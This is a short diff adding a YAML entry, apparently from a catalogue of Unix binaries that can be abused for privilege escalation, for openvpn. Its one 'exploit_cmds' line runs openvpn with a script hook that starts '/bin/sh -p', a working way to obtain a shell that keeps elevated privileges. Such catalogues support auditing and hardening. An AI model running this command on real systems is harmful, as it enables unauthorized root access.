@@ -1,0 +1,4 @@
+name: openvpn
+binary_path: /usr/bin/openvpn
+exploit_cmds:
+- /usr/bin/openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
